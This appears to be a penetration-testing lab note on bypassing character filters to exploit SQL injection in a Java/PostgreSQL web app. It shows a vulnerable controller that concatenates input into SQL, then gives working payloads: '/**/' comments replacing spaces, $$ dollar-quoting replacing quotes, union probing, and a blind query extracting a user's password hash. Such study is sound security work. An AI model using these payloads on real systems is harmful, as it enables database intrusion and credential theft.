# Common Character Bypasses

## **Blind SQL Injection**

Assume this Injection

```sql
@GetMapping({"/find-user"})
public String findUser(@RequestParam String u, Model model, HttpServletResponse response) throws IOException {
    Pattern p = Pattern.compile("'|(.*'.*'.*)");
    Matcher m = p.matcher(u);
    String u2 = u.toLowerCase();
    if (!u2.contains(" ") && !m.matches()) {
        try {
        String sql = "SELECT * FROM users WHERE username LIKE '%" + u + "%'";
        List users = this.jdbcTemplate.query(sql, new BeanPropertyRowMapper(User.class));
        UserDetailsImpl userDetails = (UserDetailsImpl)SecurityContextHolder.getContext().getAuthentication().getPrincipal();
        model.addAttribute("userDetails", userDetails);
        model.addAttribute("users", users);
        return "find-user";
        } catch (BadSqlGrammarException var10) {
        System.out.println(var10.getSQLException().getMessage());
        model.addAttribute("errorMsg", "Invalid search query");
        return "error";
        } catch (Exception var11) {
        var11.printStackTrace();
        model.addAttribute("errorMsg", "Invalid search query");
        return "error";
        }
    } else {
        model.addAttribute("errorMsg", "Illegal search term");
        return "error";
    }
}
```

- We cannot use spaces `!u2.contains(" ")`
- Checking the Regex pattern
    - Using [regex101.com](https://regex101.com/) to automatically generate an `explanation` for us, we can see that the pattern is supposed to match `single quotes` as well as strings with two `single quotes` somewhere within
    
    ![image.png](Common%20Character%20Bypasses/image.png)
    
- Since the `u` variable is concatenated between two `single quotes` in `IndexController.java`, an `SQL injection` payload would require breaking out with a `single quote`
    - `"SELECT * FROM users WHERE username LIKE '%" + u + "%'";`
    - Based on the pattern alone, this doesn't seem possible
- Unfortunately for the developer, [Matcher.matches()](https://www.javatpoint.com/post/java-matcher-matches-method) only returns `true` if the `entire` value of `u` matches the pattern, and not only part of it as he may have assumed
- What this means is that while a `single quote` and strings surrounded by `single quotes` are detected, we can insert one `single quote` into a payload without matching the `RegEx` pattern

![image.png](Common%20Character%20Bypasses/image%201.png)

![image.png](Common%20Character%20Bypasses/image%202.png)

![image.png](Common%20Character%20Bypasses/image%203.png)

- Unfortunately, payloads such as `' and 1=1--` still fail, due to the `spaces`
- Bypass this via PostgreSQL’s multi-line empty comments `'/**/and/**/1=1--`

![image.png](Common%20Character%20Bypasses/image%204.png)

## **Union-Based SQL Injection**

`PostgreSQL` allows you to use `two dollar-signs` to mark the start and end-points of a string for better readability, and we can use this to get around the `RegEx` pattern matching `single quotes` and develop a `PoC` payload for `union-based SQL injection`

```sql
' union select '1','2','3'--
```

```sql
'/**/union/**/select/**/$$1$$,$$2$$,$$3$$--
```

```sql
tail /opt/bluebird/pg_log/postgresql-2023-02-15_052440.log

<SNIP>
2023-02-15 06:27:18.389 EST [14374] bbuser@bluebird ERROR:  each UNION query must have the same number of columns at character 67
2023-02-15 06:27:18.389 EST [14374] bbuser@bluebird STATEMENT:  SELECT * FROM users WHERE username LIKE '%'/**/union/**/select/**/$$1$$,$$2$$,$$3$$--%'
<SNIP>
```

```sql
'/**/union/**/select/**/$$1$$,$$2$$,$$3$$,$$4$$,$$5$$,$$6$$--
```

![image.png](Common%20Character%20Bypasses/image%205.png)

## **Comparative Precomputation (Blind SQLi)**

Let's pretend that we were restricted to `blind SQL injection` for a moment.  Using typical algorithms to dump characters from the database, `7 requests` are required per character on average (e.g. the `bisection` algorithm that [sqlmap](https://sqlmap.org/) uses). In some cases however, it may be possible to (blindly) dump `1 or more characters per request`.

Example:

```sql
' AND id=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='itsmaria')--
```

It will only match one user, and that is the user whose `id` equals the `ascii value` of the `first character` of `itsmaria's password`. If we swap out the `spaces` and `single quotes` to bypass the character filters, our payload will look like this:

```sql
'/**/AND/**/id=(SELECT/**/ASCII(SUBSTRING(password,1,1))/**/FROM/**/users/**/WHERE/**/username=$$itsmaria$$)--
```

[**Blind SQL Injection**](../Blind%20SQL%20Injection%202722c37daa2980a39cbedcb2f14fbd2b.md) 

If we try it out, we should see the user with ID `36` appear, which corresponds to the character `$`. This is expected, since the password hashes are stored as `bcrypt` hashes which have the format `$2b$12$...`, so we now have a `blind SQL injection PoC` which can dump `one character per request`.

![image.png](Common%20Character%20Bypasses/image%206.png)